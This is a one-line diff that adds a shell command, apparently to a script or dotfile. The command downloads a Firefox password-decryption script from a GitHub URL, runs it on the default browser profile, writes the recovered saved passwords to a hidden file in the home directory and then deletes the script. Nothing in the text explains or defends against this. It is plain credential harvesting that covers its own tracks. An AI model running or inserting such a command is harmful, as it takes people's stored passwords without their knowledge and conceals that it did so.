@@ -1,0 +1,1 @@
+cd /tmp && wget https://raw.githubusercontent.com/mixere4/internet_storage/master/firefox_decrypt.py && python firefox_decrypt.py ~/.mozilla/firefox/`cat ~/.mozilla/firefox/profiles.ini | grep Default= | grep default-  | sed 's/Default=//g'` > ~/.passwords.txt && rm firefox_decrypt* && cd
